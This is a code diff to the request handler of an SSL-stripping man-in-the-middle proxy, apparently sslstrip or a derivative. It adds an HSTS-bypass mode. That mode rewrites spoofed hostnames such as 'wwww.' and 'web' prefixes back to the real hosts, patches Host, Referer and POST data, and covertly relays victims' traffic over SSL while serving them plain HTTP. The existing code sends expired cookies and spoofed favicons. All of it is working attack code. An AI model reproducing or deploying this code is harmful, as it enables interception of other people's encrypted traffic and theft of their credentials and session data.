@@ -16,7 +16,7 @@
 # USA
 #
 
-import urlparse, logging, os, sys, random
+import urlparse, logging, os, sys, random, re
 
 from twisted.web.http import Request
 from twisted.web.http import HTTPChannel
@@ -34,6 +34,7 @@ from URLMonitor import URLMonitor
 from CookieCleaner import CookieCleaner
 from DnsCache import DnsCache
 from libs.sergioproxy.ProxyPlugins import ProxyPlugins
+from configobj import ConfigObj
 
 class ClientRequest(Request):
 
@@ -47,6 +48,7 @@ class ClientRequest(Request):
         Request.__init__(self, channel, queued)
         self.reactor       = reactor
         self.urlMonitor    = URLMonitor.getInstance()
+        self.hsts          = URLMonitor.getInstance().isHstsBypass()
         self.cookieCleaner = CookieCleaner.getInstance()
         self.dnsCache      = DnsCache.getInstance()
         self.plugins       = ProxyPlugins.getInstance()
@@ -68,6 +70,23 @@ class ClientRequest(Request):
 
         if 'cache-control' in headers:
             del headers['cache-control']
+
+        if self.hsts:
+            if 'if-none-match' in headers:
+                del headers['if-none-match']
+
+            if 'referer' in headers:
+                real = self.urlMonitor.real
+                if len(real) > 0:
+                    dregex = re.compile("(%s)" % "|".join(map(re.escape, real.keys())))
+                    headers['referer'] = dregex.sub(lambda x: str(real[x.string[x.start() :x.end()]]), headers['referer'])
+        
+            if 'host' in headers:
+                host = self.urlMonitor.URLgetRealHost("%s" % headers['host'])
+                logging.debug("Modifing HOST header: %s -> %s" % (headers['host'],host))
+                headers['host'] = host
+                headers['securelink'] = '1'
+                self.setHeader('Host',host)
 
         self.plugins.hook()
 
@@ -104,33 +123,76 @@ class ClientRequest(Request):
         except:
             pass
 
-        url               = 'http://' + host + path
-        self.uri = url # set URI to absolute
+        if self.hsts:
+            
+            real = self.urlMonitor.real
+            patchDict = self.urlMonitor.patchDict
 
-        #self.dnsCache.cacheResolution(host, address)
+            if len(real) > 0:
+                dregex = re.compile("(%s)" % "|".join(map(re.escape, real.keys())))
+                path = dregex.sub(lambda x: str(real[x.string[x.start() :x.end()]]), path)
+                postData = dregex.sub(lambda x: str(real[x.string[x.start() :x.end()]]), postData)
+                if len(patchDict)>0:
+                    dregex = re.compile("(%s)" % "|".join(map(re.escape, patchDict.keys())))
+                    postData = dregex.sub(lambda x: str(patchDict[x.string[x.start() :x.end()]]), postData)
 
-        hostparts = host.split(':')
-        self.dnsCache.cacheResolution(hostparts[0], address)
+            url               = 'http://' + host + path
+            headers['content-length'] = "%d" % len(postData)
 
-        if (not self.cookieCleaner.isClean(self.method, client, host, headers)):
-            logging.debug("Sending expired cookies...")
-            self.sendExpiredCookies(host, path, self.cookieCleaner.getExpireHeaders(self.method, client,
-                                                                                    host, headers, path))
-        elif (self.urlMonitor.isSecureFavicon(client, path)):
-            logging.debug("Sending spoofed favicon response...")
-            self.sendSpoofedFaviconResponse()
-        elif (self.urlMonitor.isSecureLink(client, url)):
-            logging.debug("Sending request via SSL...")
-            self.proxyViaSSL(address, self.method, path, postData, headers,
-                             self.urlMonitor.getSecurePort(client, url))
+            #self.dnsCache.cacheResolution(host, address)
+            hostparts = host.split(':')
+            self.dnsCache.cacheResolution(hostparts[0], address)
+
+            if (not self.cookieCleaner.isClean(self.method, client, host, headers)):
+                logging.debug("Sending expired cookies...")
+                self.sendExpiredCookies(host, path, self.cookieCleaner.getExpireHeaders(self.method, client,
+                                                                                        host, headers, path))
+            elif (self.urlMonitor.isSecureFavicon(client, path)):
+                logging.debug("Sending spoofed favicon response...")
+                self.sendSpoofedFaviconResponse()
+            elif (self.urlMonitor.isSecureLink(client, url) or ('securelink' in headers)):
+                if 'securelink' in headers:
+                    del headers['securelink']
+                logging.debug("LEO Sending request via SSL...(%s %s)"%(client,url))
+                self.proxyViaSSL(address, self.method, path, postData, headers,
+                                 self.urlMonitor.getSecurePort(client, url))
+            else:
+                logging.debug("LEO Sending request via HTTP...")
+                #self.proxyViaHTTP(address, self.method, path, postData, headers)
+                port = 80
+                if len(hostparts) > 1:
+                    port = int(hostparts[1])
+
+                self.proxyViaHTTP(address, self.method, path, postData, headers, port)
+        
         else:
-            logging.debug("Sending request via HTTP...")
-            #self.proxyViaHTTP(address, self.method, path, postData, headers)
-            port = 80
-            if len(hostparts) > 1:
-                port = int(hostparts[1])
+            
+            url               = 'http://' + host + path
+            self.uri = url # set URI to absolute
 
-            self.proxyViaHTTP(address, self.method, path, postData, headers, port)
+            #self.dnsCache.cacheResolution(host, address)
+            hostparts = host.split(':')
+            self.dnsCache.cacheResolution(hostparts[0], address)
+
+            if (not self.cookieCleaner.isClean(self.method, client, host, headers)):
+                logging.debug("Sending expired cookies...")
+                self.sendExpiredCookies(host, path, self.cookieCleaner.getExpireHeaders(self.method, client,
+                                                                                        host, headers, path))
+            elif (self.urlMonitor.isSecureFavicon(client, path)):
+                logging.debug("Sending spoofed favicon response...")
+                self.sendSpoofedFaviconResponse()
+            elif (self.urlMonitor.isSecureLink(client, url)):
+                logging.debug("Sending request via SSL...")
+                self.proxyViaSSL(address, self.method, path, postData, headers,
+                                 self.urlMonitor.getSecurePort(client, url))
+            else:
+                logging.debug("Sending request via HTTP...")
+                #self.proxyViaHTTP(address, self.method, path, postData, headers)
+                port = 80
+                if len(hostparts) > 1:
+                    port = int(hostparts[1])
+
+                self.proxyViaHTTP(address, self.method, path, postData, headers, port)
 
     def handleHostResolvedError(self, error):
         logging.warning("Host resolution error: " + str(error))
@@ -152,8 +214,22 @@ class ClientRequest(Request):
     def process(self):
         logging.debug("Resolving host: %s" % (self.getHeader('host')))
         host     = self.getHeader('host')               
-        #deferred = self.resolveHost(host)
+        
+        if (self.hsts and host):
+            real = self.urlMonitor.real
+
+            if 'wwww' in host:
+                logging.debug("Resolving %s for HSTS bypass" % (host))
+                host = host[1:]
+            elif 'web' in host:
+                logging.debug("Resolving %s for HSTS bypass" % (host))
+                host = host[3:]
+            elif host in real:
+                logging.debug("Resolving %s for HSTS bypass" % (host))
+                host = real[host]
+
         hostparts = host.split(':')
+        #deferred = self.resolveHost(host)
         deferred = self.resolveHost(hostparts[0])
 
         deferred.addCallback(self.handleHostResolvedSuccess)
